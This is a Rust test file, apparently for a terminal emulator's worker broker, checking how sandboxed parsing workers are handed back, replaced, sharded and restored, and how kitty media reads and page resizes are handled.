fn a_worker_of_another_wire_version_is_handed_back_and_later_terminals_go_elsewhere() {
    let old = FakeConfig { version: WIRE_VERSION - 1, ..FakeConfig::default() };
    let h = harness(2, vec![old, FakeConfig::default()], reseeds(1..=2, reseed(0, 0, 0)));
    h.broker.attach(spec(1));
    let handed = life(&h.events, |l| matches!(l, WorkerLifecycle::HandedBack { .. }));
    assert_eq!(
        handed,
        WorkerLifecycle::HandedBack {
            shard: Some(0),
            reason: HandBack::WireVersion(WIRE_VERSION - 1),
            terminals: vec![VtTerminalKey(1)],
        }
    );
    // Shard 0 is out: terminal 2 goes to shard 1 and is parsed there.
    h.broker.attach(spec(2));
    let attach = wait_for(&h.seen, |seen| matches!(seen, Seen::Attach { .. }));
    assert!(matches!(attach, Seen::Attach { shard: 1, terminal: 2, .. }), "{attach:?}");
    h.broker.advance(VtTerminalKey(2), 10);
    wait_for(&h.events, |event| *event == HostEvent::Parsed(VtTerminalKey(2), 10));
}

#[test]
fn a_worker_that_reports_another_sandbox_gets_no_ring() {
    let mut setup = Setup::new(1, vec![FakeConfig::default()]);
    setup.sandbox = WorkerSandbox::unchecked(
        SandboxPolicy::Seatbelt(vec![1, 2, 3]),
        SandboxMechanism::Seatbelt,
    );
    let h = setup.start(reseeds([1], reseed(0, 0, 0)));
    h.broker.attach(spec(1));
    let handed = life(&h.events, |l| matches!(l, WorkerLifecycle::HandedBack { .. }));
    assert_eq!(
        handed,
        WorkerLifecycle::HandedBack {
            shard: Some(0),
            reason: HandBack::Sandbox(SandboxMechanism::None),
            terminals: vec![VtTerminalKey(1)],
        }
    );
    drop(h.broker);
    let seen: Vec<_> = h.seen.try_iter().collect();
    assert_eq!(
        seen,
        [Seen::Bootstrap { shard: 0, policy: SandboxPolicy::Seatbelt(vec![1, 2, 3]) }],
        "the compiled policy went first and no ring followed"
    );
}

#[test]
fn a_worker_that_sends_no_hello_is_replaced() {
    let mut setup = Setup::new(
        1,
        vec![FakeConfig { silent: true, ..FakeConfig::default() }, FakeConfig::default()],
    );
    setup.hello_timeout = Duration::from_millis(100);
    let h = setup.start(reseeds([1], reseed(0, 0, 0)));
    h.broker.attach(spec(1));
    let event = lost(&h.events);
    assert!(matches!(event, WorkerLifecycle::Lost { cause: LinkEnd::NoHello, .. }), "{event:?}");
    assert_eq!(restored(&h.events, 0).1, 1);
}

#[test]
fn a_worker_that_stops_reading_is_replaced() {
    // 96 prologues of 128 KiB overflow the socket and a 64-command queue.
    let mut plan = reseed(0, 0, 0);
    plan.prologue.bytes = vec![b'x'; 128 * 1024];
    let configs = vec![FakeConfig { hung: true, ..FakeConfig::default() }, FakeConfig::default()];
    let h = harness(1, configs, reseeds(1..=96, plan));
    for key in 1..=96 {
        h.broker.attach(spec(key));
    }
    let event = lost(&h.events);
    assert!(matches!(event, WorkerLifecycle::Lost { cause: LinkEnd::Hung, .. }), "{event:?}");
    all_attached(&h.events, 96);
}

#[test]
fn a_kitty_file_read_is_asked_of_the_host_and_its_answer_resumes_the_parse() {
    let h = harness(
        1,
        vec![FakeConfig { media: true, ..FakeConfig::default() }],
        reseeds([1], reseed(0, 0, 0)),
    );
    h.broker.attach(spec(1));
    all_attached(&h.events, 1);
    h.broker.advance(VtTerminalKey(1), 10);
    wait_for(&h.events, |event| *event == HostEvent::Media(VtTerminalKey(1)));
    wait_for(&h.events, |event| *event == HostEvent::Parsed(VtTerminalKey(1), 10));
    assert!(h.seen.try_iter().any(|seen| seen == Seen::Media { terminal: 1 }));
}

#[test]
fn a_page_too_small_is_replaced_by_a_bigger_one() {
    // More than the first page of an 80 x 24 screen.
    let needed = 100_000;
    let h = harness(
        1,
        vec![FakeConfig { page_too_small: Some(needed), ..FakeConfig::default() }],
        reseeds([1], reseed(0, 0, 0)),
    );
    h.broker.attach(spec(1));
    let resize = wait_for(&h.seen, |seen| matches!(seen, Seen::Resize { .. }));
    let Seen::Resize { terminal: 1, page_len: Some(len) } = resize else { panic!("{resize:?}") };
    assert!(len >= needed, "{len}");
    wait_for(&h.events, |event| *event == HostEvent::Page(VtTerminalKey(1), len));
}

#[test]
fn terminals_spread_over_shards_and_a_loss_restores_only_its_own_shard() {
    let h = harness(2, vec![FakeConfig::default()], reseeds(1..=4, reseed(0, 0, 10)));
    for key in 1..=4 {
        h.broker.attach(spec(key));
    }
    let mut shards: Vec<_> = (0..4)
        .map(|_| wait_for(&h.seen, |seen| matches!(seen, Seen::Attach { .. })))
        .map(|seen| match seen {
            Seen::Attach { terminal, shard, .. } => (terminal, shard),
            _ => unreachable!(),
        })
        .collect();
    shards.sort_unstable();
    assert_eq!(shards, [(1, 0), (2, 1), (3, 0), (4, 1)]);
    let kills: Vec<_> = (0..2).map(|_| wait_for(&h.kills, |_| true)).collect();
    for _ in 0..2 {
        life(&h.events, |l| matches!(l, WorkerLifecycle::Restored { terminals: 2, .. }));
    }
    let (_, shard0) = kills.iter().find(|(shard, _)| *shard == 0).expect("shard 0's worker");
    shard0.shutdown(Shutdown::Both).expect("kill shard 0's worker");
    assert_eq!(restored(&h.events, 0).1, 2);
    h.broker.advance(VtTerminalKey(2), 20);
    wait_for(&h.events, |event| *event == HostEvent::Parsed(VtTerminalKey(2), 20));
    let reseeded: Vec<_> = h
        .seen
        .try_iter()
        .filter_map(|seen| match seen {
            Seen::Attach { shard, .. } => Some(shard),
            _ => None,
        })
        .collect();
    assert_eq!(reseeded, [0, 0], "only shard 0 reseeds");
}

#[test]
fn only_the_word_process_asks_for_worker_processes() {
    assert!(process_workers_requested(Some("process")));
    assert!(process_workers_requested(Some(" process\n")));
    for value in [None, Some(""), Some("threads"), Some("PROCESS"), Some("1")] {
        assert!(!process_workers_requested(value), "{value:?}");
    }
}
